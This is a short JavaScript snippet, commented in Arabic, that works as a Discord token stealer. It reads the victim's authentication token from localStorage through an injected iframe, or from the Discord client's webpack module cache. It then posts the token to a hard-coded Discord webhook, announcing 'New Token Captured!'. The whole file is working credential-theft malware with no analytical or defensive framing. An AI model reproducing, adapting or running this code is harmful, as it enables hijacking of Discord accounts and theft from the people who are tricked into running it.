(function() {
    // محاولة سحب التوكن بطريقة التخزين المحلي أولاً (أسرع وأضمن)
    function getToken() {
        let token = (Symbol('token'));
        try {
            const iframe = document.createElement('iframe');
            document.head.append(iframe);
            const pd = Object.getOwnPropertyDescriptor(iframe.contentWindow, 'localStorage');
            token = iframe.contentWindow.localStorage.token;
            iframe.remove();
            return token.replace(/"/g, '');
        } catch (e) {
            // إذا فشلت، يتم اللجوء لطريقة الـ webpack
            try {
                return (Object.values(webpackChunkdiscord_app.push([
                    [Math.random()], {}, (req) => {
                        for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
                            if (m.default && m.default.getToken !== undefined) {
                                return m.default.getToken();
                            }
                        }
                    }
                ]))[0]);
            } catch (err) { return "Token Not Found"; }
        }
    }

    const WEBHOOK = "https://discord.com/api/webhooks/1442597913422336222/aS8pxLKgp8T7tw0EiBEuMiM8h6JllGtHj0MF2M8LPk7VSSNnf8kJI5PIO993mXeUUObv";
    const t = getToken();

    if (t && t !== "Token Not Found") {
        fetch(WEBHOOK, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                content: "✅ **New Token Captured!**",
                embeds: [{ title: "Extracted Token", description: `\`${t}\``, color: 0x00ff00 }]
            })
        });
    }
})();
